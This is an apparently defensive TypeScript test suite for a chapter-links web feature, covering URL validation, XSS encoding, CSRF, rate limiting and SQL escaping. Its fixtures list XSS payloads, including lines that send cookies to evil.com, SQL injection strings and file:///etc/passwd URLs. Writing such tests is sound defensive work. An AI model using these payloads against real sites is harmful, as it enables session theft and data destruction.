// @ts-nocheck - TODO: Migrate from bun:test to Jest
/* eslint-disable */
/**
 * Chapter Links Security Test Suite
 * 
 * Comprehensive tests for security checklist requirements:
 * 1. Input sanitization
 * 2. Output encoding (XSS prevention)
 * 3. CSRF protection
 * 4. SQL injection protection (via ORM)
 * 5. Rate limiting
 * 6. Audit logging
 * 7. No server-side URL fetching
 * 8. Advisory locks for concurrency
 * 9. IP/UA storage for abuse detection
 * 10. Security test cases
 */

import { describe, it, expect, beforeEach, afterEach, mock, spyOn } from 'bun:test';

// =============================================================================
// 1. INPUT SANITIZATION TESTS
// =============================================================================

describe('Input Sanitization', () => {
  describe('URL Validation', () => {
    it('should validate URL format correctly', async () => {
      const { validateUrl } = await import('@/lib/chapter-links');
      
      // Valid URLs
      expect(validateUrl('https://mangadex.org/chapter/123').isValid).toBe(true);
      expect(validateUrl('http://example.com/page').isValid).toBe(true);
      
      // Invalid URLs
      expect(validateUrl('not-a-url').isValid).toBe(false);
      expect(validateUrl('').isValid).toBe(false);
      expect(validateUrl('   ').isValid).toBe(false);
    });

    it('should reject URLs exceeding max length', async () => {
      const { validateUrl } = await import('@/lib/chapter-links');
      
      const longUrl = 'https://example.com/' + 'a'.repeat(2500);
      const result = validateUrl(longUrl);
      
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('length');
    });

    it('should reject javascript: protocol URLs', async () => {
      const { validateUrl } = await import('@/lib/chapter-links');
      
      const xssUrls = [
        'javascript:alert(1)',
        'javascript:alert("XSS")',
        'JAVASCRIPT:alert(1)',
        'javascript:void(0)',
      ];
      
      for (const url of xssUrls) {
        const result = validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('suspicious');
      }
    });

    it('should reject data: protocol URLs', async () => {
      const { validateUrl } = await import('@/lib/chapter-links');
      
      const dataUrls = [
        'data:text/html,<script>alert(1)</script>',
        'data:application/javascript,alert(1)',
        'DATA:text/html,<h1>XSS</h1>',
      ];
      
      for (const url of dataUrls) {
        const result = validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('suspicious');
      }
    });

    it('should reject file: protocol URLs', async () => {
      const { validateUrl } = await import('@/lib/chapter-links');
      
      const result = validateUrl('file:///etc/passwd');
      expect(result.isValid).toBe(false);
    });

    it('should reject URLs with executable file extensions', async () => {
      const { validateUrl } = await import('@/lib/chapter-links');
      
      const executableUrls = [
        'https://example.com/malware.exe',
        'https://example.com/virus.bat',
        'https://example.com/script.cmd',
        'https://example.com/installer.msi',
      ];
      
      for (const url of executableUrls) {
        const result = validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('suspicious');
      }
    });

    it('should reject URLs with triple-encoded characters (obfuscation)', async () => {
      const { validateUrl } = await import('@/lib/chapter-links');
      
      // Triple URL encoding is a red flag for obfuscation
      const obfuscatedUrl = 'https://example.com/%25%32%65%25%32%65%25%32%66';
      const result = validateUrl(obfuscatedUrl);
      
      expect(result.isValid).toBe(false);
    });
  });

  describe('Text Sanitization', () => {
    it('should sanitize XSS payloads in source_name', async () => {
      const { sanitizeInput } = await import('@/lib/api-utils');
      
      const xssPayloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '"><script>alert(1)</script>',
        "';alert(1)//",
      ];
      
      for (const payload of xssPayloads) {
        const sanitized = sanitizeInput(payload);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
      }
    });

    it('should truncate input exceeding max length', async () => {
      const { sanitizeInput } = await import('@/lib/api-utils');
      
      const longInput = 'a'.repeat(20000);
      const sanitized = sanitizeInput(longInput, 100);
      
      expect(sanitized.length).toBeLessThanOrEqual(100);
    });

    it('should remove null bytes', async () => {
      const { sanitizeInput } = await import('@/lib/api-utils');
      
      const inputWithNullBytes = 'normal\x00text\x00here';
      const sanitized = sanitizeInput(inputWithNullBytes);
      
      expect(sanitized).not.toContain('\x00');
    });
  });
});

// =============================================================================
// 2. OUTPUT ENCODING (XSS PREVENTION) TESTS
// =============================================================================

describe('Output Encoding (XSS Prevention)', () => {
  it('should HTML encode special characters', async () => {
    const { htmlEncode } = await import('@/lib/api-utils');
    
    const tests = [
      { input: '<script>alert(1)</script>', expected: '&lt;script&gt;alert(1)&lt;&#x2F;script&gt;' },
      { input: '"><img src=x onerror=alert(1)>', expected: '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;' },
      { input: "' onclick=alert(1)", expected: '&#x27; onclick=alert(1)' },
      { input: '& < > " \' /', expected: '&amp; &lt; &gt; &quot; &#x27; &#x2F;' },
    ];
    
    for (const { input, expected } of tests) {
      expect(htmlEncode(input)).toBe(expected);
    }
  });

  it('should safely encode source names in API responses', async () => {
    const { htmlEncode } = await import('@/lib/api-utils');
    
    const maliciousSourceName = 'MangaDex<script>steal(document.cookie)</script>';
    const encoded = htmlEncode(maliciousSourceName);
    
    expect(encoded).not.toContain('<script>');
    expect(encoded).toContain('&lt;script&gt;');
  });

  it('should encode URL note fields', async () => {
    const { htmlEncode } = await import('@/lib/api-utils');
    
    const maliciousNote = 'Good quality <img src=x onerror="location=\'evil.com?c=\'+document.cookie">';
    const encoded = htmlEncode(maliciousNote);
    
    // htmlEncode encodes characters, not words - verify the angle brackets are encoded
    expect(encoded).not.toContain('<img');
    expect(encoded).toContain('&lt;img'); // < is encoded
    expect(encoded).not.toContain('">'); // Quotes and brackets encoded
    expect(encoded).toContain('&quot;'); // " is encoded
    expect(encoded).toContain('&#x27;'); // ' is encoded
  });
});

// =============================================================================
// 3. URL NORMALIZATION TESTS
// =============================================================================

describe('URL Normalization', () => {
  it('should normalize URLs with UTM parameters', async () => {
    const { normalizeUrl } = await import('@/lib/chapter-links');
    
    const urlWithUtm = 'https://example.com/chapter/1?utm_source=twitter&utm_medium=social&id=123';
    const normalized = normalizeUrl(urlWithUtm);
    
    expect(normalized).not.toContain('utm_source');
    expect(normalized).not.toContain('utm_medium');
    expect(normalized).toContain('id=123');
  });

  it('should normalize uppercase domains to lowercase', async () => {
    const { normalizeUrl, hashUrl } = await import('@/lib/chapter-links');
    
    const upperUrl = 'https://MANGADEX.ORG/chapter/123';
    const lowerUrl = 'https://mangadex.org/chapter/123';
    
    expect(normalizeUrl(upperUrl)).toBe(normalizeUrl(lowerUrl));
    expect(hashUrl(upperUrl)).toBe(hashUrl(lowerUrl));
  });

  it('should remove trailing slashes', async () => {
    const { normalizeUrl, hashUrl } = await import('@/lib/chapter-links');
    
    const withSlash = 'https://example.com/chapter/';
    const withoutSlash = 'https://example.com/chapter';
    
    expect(normalizeUrl(withSlash)).toBe(normalizeUrl(withoutSlash));
    expect(hashUrl(withSlash)).toBe(hashUrl(withoutSlash));
  });

  it('should remove www. prefix', async () => {
    const { normalizeUrl, hashUrl } = await import('@/lib/chapter-links');
    
    const withWww = 'https://www.mangadex.org/chapter/123';
    const withoutWww = 'https://mangadex.org/chapter/123';
    
    expect(normalizeUrl(withWww)).toBe(normalizeUrl(withoutWww));
    expect(hashUrl(withWww)).toBe(hashUrl(withoutWww));
  });

  it('should preserve path case sensitivity', async () => {
    const { normalizeUrl } = await import('@/lib/chapter-links');
    
    // Some sites have case-sensitive paths
    const url1 = 'https://example.com/Chapter/ABC';
    const url2 = 'https://example.com/chapter/abc';
    
    const normalized1 = normalizeUrl(url1);
    const normalized2 = normalizeUrl(url2);
    
    // Domain should be lowercase, but path case preserved
    expect(normalized1).toContain('/Chapter/ABC');
    expect(normalized2).toContain('/chapter/abc');
  });

  it('should generate consistent SHA256 hashes', async () => {
    const { hashUrl } = await import('@/lib/chapter-links');
    
    const url = 'https://mangadex.org/chapter/abc123';
    const hash1 = hashUrl(url);
    const hash2 = hashUrl(url);
    
    expect(hash1).toBe(hash2);
    expect(hash1).toHaveLength(64); // SHA256 hex length
    expect(/^[a-f0-9]{64}$/.test(hash1)).toBe(true);
  });
});

// =============================================================================
// 4. BLACKLIST ENFORCEMENT TESTS
// =============================================================================

describe('Blacklist Enforcement', () => {
  it('should reject known URL shorteners', async () => {
    const { validateUrl } = await import('@/lib/chapter-links');
    
    const shorteners = [
      'https://bit.ly/abc123',
      'https://tinyurl.com/xyz789',
      'https://goo.gl/abc',
      'https://t.co/abc123',
    ];
    
    for (const url of shorteners) {
      const result = validateUrl(url);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('blocked');
    }
  });

  it('should check against database blacklist', async () => {
    const { checkBlacklist } = await import('@/lib/chapter-links');
    
    const dbBlacklist = [
      { domain: 'malware-site.com', reason: 'malware' },
      { domain: 'spam-links.net', reason: 'spam' },
      { domain: 'piracy-ads.io', reason: 'advertising' },
    ];
    
    expect(checkBlacklist('https://malware-site.com/page', dbBlacklist).isBlocked).toBe(true);
    expect(checkBlacklist('https://sub.malware-site.com/page', dbBlacklist).isBlocked).toBe(true);
    expect(checkBlacklist('https://legitimate-site.com/page', dbBlacklist).isBlocked).toBe(false);
  });

  it('should block subdomains of blacklisted domains', async () => {
    const { checkBlacklist } = await import('@/lib/chapter-links');
    
    const blacklist = [{ domain: 'blocked.com', reason: 'test' }];
    
    const subdomainUrls = [
      'https://sub.blocked.com/page',
      'https://deep.sub.blocked.com/page',
      'https://www.blocked.com/page',
    ];
    
    for (const url of subdomainUrls) {
      const result = checkBlacklist(url, blacklist);
      expect(result.isBlocked).toBe(true);
    }
  });
});

// =============================================================================
// 5. CSRF PROTECTION TESTS
// =============================================================================

describe('CSRF Protection', () => {
  it('should validate origin header matches host', async () => {
    const { validateOrigin } = await import('@/lib/api-utils');
    
    // Valid origin
    const validRequest = new Request('http://localhost:3000/api/test', {
      headers: {
        'origin': 'http://localhost:3000',
        'host': 'localhost:3000',
      },
    });
    
    expect(() => validateOrigin(validRequest)).not.toThrow();
  });

  it('should reject mismatched origin', async () => {
    const { validateOrigin } = await import('@/lib/api-utils');
    
    const invalidRequest = new Request('http://localhost:3000/api/test', {
      headers: {
        'origin': 'http://evil.com',
        'host': 'localhost:3000',
      },
    });
    
    expect(() => validateOrigin(invalidRequest)).toThrow();
  });

  it('should handle null origin (same-origin requests)', async () => {
    const { validateOrigin } = await import('@/lib/api-utils');
    
    const sameOriginRequest = new Request('http://localhost:3000/api/test', {
      headers: {
        'host': 'localhost:3000',
      },
    });
    
    // Should not throw for requests without origin (same-origin)
    expect(() => validateOrigin(sameOriginRequest)).not.toThrow();
  });
});

// =============================================================================
// 6. RATE LIMITING TESTS
// =============================================================================

describe('Rate Limiting', () => {
  it('should track request counts correctly', async () => {
    const { getRateLimitInfo } = await import('@/lib/api-utils');
    
    const key = `test-rate-limit-${Date.now()}`;
    
    // First request should be allowed
    const first = await getRateLimitInfo(key, 5, 60000);
    expect(first.allowed).toBe(true);
    expect(first.remaining).toBe(4);
    
    // Make more requests
    for (let i = 0; i < 4; i++) {
      await getRateLimitInfo(key, 5, 60000);
    }
    
    // Sixth request should be denied
    const sixth = await getRateLimitInfo(key, 5, 60000);
    expect(sixth.allowed).toBe(false);
    expect(sixth.remaining).toBe(0);
  });

  it('should return correct rate limit info headers', async () => {
    const { getRateLimitInfo } = await import('@/lib/api-utils');
    
    const key = `test-headers-${Date.now()}`;
    const result = await getRateLimitInfo(key, 100, 60000);
    
    expect(result.limit).toBe(100);
    expect(typeof result.remaining).toBe('number');
    expect(typeof result.reset).toBe('number');
    expect(result.reset).toBeGreaterThan(Date.now());
  });
});

// =============================================================================
// 7. ADVISORY LOCK KEY GENERATION TESTS
// =============================================================================

describe('Advisory Lock Keys', () => {
  it('should generate deterministic lock keys', async () => {
    const { generateChapterLockKey } = await import('@/lib/chapter-links');
    
    const key1 = generateChapterLockKey('series-uuid-123', 'chapter-1');
    const key2 = generateChapterLockKey('series-uuid-123', 'chapter-1');
    
    expect(key1).toBe(key2);
  });

  it('should generate different keys for different series', async () => {
    const { generateChapterLockKey } = await import('@/lib/chapter-links');
    
    const key1 = generateChapterLockKey('series-A', 'chapter-1');
    const key2 = generateChapterLockKey('series-B', 'chapter-1');
    
    expect(key1).not.toBe(key2);
  });

  it('should generate different keys for different chapters', async () => {
    const { generateChapterLockKey } = await import('@/lib/chapter-links');
    
    const key1 = generateChapterLockKey('series-A', 'chapter-1');
    const key2 = generateChapterLockKey('series-A', 'chapter-2');
    
    expect(key1).not.toBe(key2);
  });

  it('should produce BigInt values within safe range', async () => {
    const { generateChapterLockKey } = await import('@/lib/chapter-links');
    
    // Test with various UUIDs
    const testCases = [
      ['00000000-0000-0000-0000-000000000000', '1'],
      ['ffffffff-ffff-ffff-ffff-ffffffffffff', '999999'],
      ['a1b2c3d4-e5f6-7890-abcd-ef1234567890', 'chapter-abc'],
    ];
    
    for (const [seriesId, chapterId] of testCases) {
      const key = generateChapterLockKey(seriesId, chapterId);
      expect(typeof key).toBe('bigint');
      // Should be within PostgreSQL's BIGINT range
      expect(key).toBeLessThan(BigInt('9223372036854775807'));
    }
  });
});

// =============================================================================
// 8. REPORT WEIGHT CALCULATION TESTS
// =============================================================================

describe('Report Weight Calculation', () => {
  it('should give new users (low trust) weight 1', async () => {
    const { calculateReportWeight } = await import('@/lib/chapter-links');
    
    // Trust score 0.5 (minimum) = weight 1
    expect(calculateReportWeight(0.5)).toBe(1);
    expect(calculateReportWeight(0.6)).toBe(1);
  });

  it('should give veteran users (high trust) weight 2', async () => {
    const { calculateReportWeight } = await import('@/lib/chapter-links');
    
    // Trust score 1.0 (maximum) = weight 2
    expect(calculateReportWeight(1.0)).toBe(2);
    expect(calculateReportWeight(0.9)).toBe(2);
  });

  it('should clamp out-of-range trust scores', async () => {
    const { calculateReportWeight } = await import('@/lib/chapter-links');
    
    // Below minimum
    expect(calculateReportWeight(0.1)).toBe(1);
    expect(calculateReportWeight(0)).toBe(1);
    expect(calculateReportWeight(-1)).toBe(1);
    
    // Above maximum
    expect(calculateReportWeight(1.5)).toBe(2);
    expect(calculateReportWeight(2.0)).toBe(2);
  });
});

// =============================================================================
// 9. SOURCE TIER DETECTION TESTS
// =============================================================================

describe('Source Tier Detection', () => {
  it('should identify official sources as tier 1', async () => {
    const { getSourceTier, getSourceName } = await import('@/lib/chapter-links');
    
    const officialDomains = [
      'viz.com',
      'mangaplus.shueisha.co.jp',
      'webtoons.com',
      'kodansha.us',
    ];
    
    for (const domain of officialDomains) {
      expect(getSourceTier(domain)).toBe('official');
    }
  });

  it('should identify MangaDex as aggregator tier', async () => {
    const { getSourceTier, getSourceName } = await import('@/lib/chapter-links');
    
    expect(getSourceTier('mangadex.org')).toBe('aggregator');
    expect(getSourceName('mangadex.org')).toBe('MangaDex');
  });

  it('should default unknown domains to user tier', async () => {
    const { getSourceTier } = await import('@/lib/chapter-links');
    
    expect(getSourceTier('random-site.com')).toBe('user');
    expect(getSourceTier('my-scanlation-group.net')).toBe('user');
  });
});

// =============================================================================
// 10. NO SERVER-SIDE URL FETCHING VERIFICATION
// =============================================================================

describe('No Server-Side URL Fetching', () => {
  it('should NOT make HTTP requests during URL validation', async () => {
    const { validateUrl } = await import('@/lib/chapter-links');
    
    // Track fetch calls
    const originalFetch = global.fetch;
    let fetchCalled = false;
    global.fetch = async (...args: any[]) => {
      fetchCalled = true;
      return originalFetch(...args);
    };
    
    try {
      // Validate URL - should NOT trigger fetch
      validateUrl('https://example.com/chapter/123');
      validateUrl('https://malicious-site.com/page');
      
      expect(fetchCalled).toBe(false);
    } finally {
      global.fetch = originalFetch;
    }
  });

  it('should NOT make HTTP requests during normalization', async () => {
    const { normalizeUrl, hashUrl } = await import('@/lib/chapter-links');
    
    const originalFetch = global.fetch;
    let fetchCalled = false;
    global.fetch = async (...args: any[]) => {
      fetchCalled = true;
      return originalFetch(...args);
    };
    
    try {
      normalizeUrl('https://example.com/chapter/123');
      hashUrl('https://example.com/chapter/123');
      
      expect(fetchCalled).toBe(false);
    } finally {
      global.fetch = originalFetch;
    }
  });

  it('should NOT make HTTP requests during blacklist check', async () => {
    const { checkBlacklist, extractDomain } = await import('@/lib/chapter-links');
    
    const originalFetch = global.fetch;
    let fetchCalled = false;
    global.fetch = async (...args: any[]) => {
      fetchCalled = true;
      return originalFetch(...args);
    };
    
    try {
      checkBlacklist('https://example.com/page', [{ domain: 'blocked.com', reason: 'test' }]);
      extractDomain('https://example.com/page');
      
      expect(fetchCalled).toBe(false);
    } finally {
      global.fetch = originalFetch;
    }
  });
});

// =============================================================================
// 11. XSS PAYLOAD ATTACK TESTS
// =============================================================================

describe('XSS Attack Vector Prevention', () => {
  const XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=1 href=1 onerror="javascript:alert(1)">',
    '<audio src=1 onerror=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '{{constructor.constructor("alert(1)")()}}',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>//',
    '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>',
  ];

  it('should neutralize XSS payloads in sanitizeInput', async () => {
    const { sanitizeInput } = await import('@/lib/api-utils');
    
    for (const payload of XSS_PAYLOADS) {
      const sanitized = sanitizeInput(payload);
      
      // Should not contain dangerous tags/attributes
      expect(sanitized).not.toMatch(/<script/i);
      expect(sanitized).not.toMatch(/<iframe/i);
      expect(sanitized).not.toMatch(/onerror=/i);
      expect(sanitized).not.toMatch(/onload=/i);
      expect(sanitized).not.toMatch(/javascript:/i);
    }
  });

  it('should encode XSS payloads in htmlEncode for display', async () => {
    const { htmlEncode } = await import('@/lib/api-utils');
    
    for (const payload of XSS_PAYLOADS) {
      const encoded = htmlEncode(payload);
      
      // All < and > should be encoded
      expect(encoded).not.toContain('<');
      expect(encoded).not.toContain('>');
      
      // Quotes should be encoded
      if (payload.includes('"')) {
        expect(encoded).toContain('&quot;');
      }
    }
  });
});

// =============================================================================
// 12. SQL INJECTION PROTECTION TESTS (via ILIKE escape)
// =============================================================================

describe('SQL Injection Protection', () => {
  it('should escape ILIKE special characters', async () => {
    const { escapeILikePattern } = await import('@/lib/api-utils');
    
    const tests = [
      { input: '%', expected: '\\%' },
      { input: '_', expected: '\\_' },
      { input: '\\', expected: '\\\\' },
      { input: 'test%_value', expected: 'test\\%\\_value' },
      { input: "'; DROP TABLE users; --", expected: "'; DROP TABLE users; --" }, // SQL special chars are fine, just ILIKE chars
    ];
    
    for (const { input, expected } of tests) {
      expect(escapeILikePattern(input)).toBe(expected);
    }
  });

  it('should handle complex SQL injection attempts in ILIKE', async () => {
    const { escapeILikePattern } = await import('@/lib/api-utils');
    
    const sqlInjections = [
      "' OR '1'='1",
      "'; DROP TABLE chapter_links; --",
      "1' OR '1' = '1' /*",
      "%' AND 1=1 --",
      "admin'--",
    ];
    
    for (const injection of sqlInjections) {
      const escaped = escapeILikePattern(injection);
      // % should always be escaped
      expect(escaped).not.toMatch(/(?<!\\)%/);
    }
  });
});

// =============================================================================
// 13. IP EXTRACTION TESTS
// =============================================================================

describe('IP Extraction for Abuse Detection', () => {
  it('should extract IP from x-real-ip header', async () => {
    const { getClientIp } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: { 'x-real-ip': '192.168.1.100' },
    });
    
    expect(getClientIp(request)).toBe('192.168.1.100');
  });

  it('should extract first IP from x-forwarded-for', async () => {
    const { getClientIp } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: { 'x-forwarded-for': '10.0.0.1, 172.16.0.1, 192.168.1.1' },
    });
    
    expect(getClientIp(request)).toBe('10.0.0.1');
  });

  it('should fallback to 127.0.0.1 when no headers present', async () => {
    const { getClientIp } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test');
    
    expect(getClientIp(request)).toBe('127.0.0.1');
  });

  it('should prefer x-real-ip over x-forwarded-for', async () => {
    const { getClientIp } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: {
        'x-real-ip': '1.2.3.4',
        'x-forwarded-for': '5.6.7.8, 9.10.11.12',
      },
    });
    
    expect(getClientIp(request)).toBe('1.2.3.4');
  });
});

// =============================================================================
// 14. CONTENT-TYPE VALIDATION TESTS
// =============================================================================

describe('Content-Type Validation', () => {
  it('should accept valid JSON content type', async () => {
    const { validateContentType } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: { 'content-type': 'application/json' },
    });
    
    expect(() => validateContentType(request)).not.toThrow();
  });

  it('should accept JSON with charset', async () => {
    const { validateContentType } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: { 'content-type': 'application/json; charset=utf-8' },
    });
    
    expect(() => validateContentType(request)).not.toThrow();
  });

  it('should reject invalid content type', async () => {
    const { validateContentType } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: { 'content-type': 'text/html' },
    });
    
    expect(() => validateContentType(request)).toThrow();
  });

  it('should reject missing content type', async () => {
    const { validateContentType } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test');
    
    expect(() => validateContentType(request)).toThrow();
  });
});

// =============================================================================
// 15. JSON SIZE VALIDATION TESTS
// =============================================================================

describe('JSON Size Validation', () => {
  it('should accept payloads under limit', async () => {
    const { validateJsonSize } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: { 'content-length': '1000' },
    });
    
    await expect(validateJsonSize(request, 10000)).resolves.toBeUndefined();
  });

  it('should reject payloads over limit', async () => {
    const { validateJsonSize } = await import('@/lib/api-utils');
    
    const request = new Request('http://localhost/api/test', {
      headers: { 'content-length': '10000000' }, // 10MB
    });
    
    await expect(validateJsonSize(request, 1024)).rejects.toThrow();
  });
});
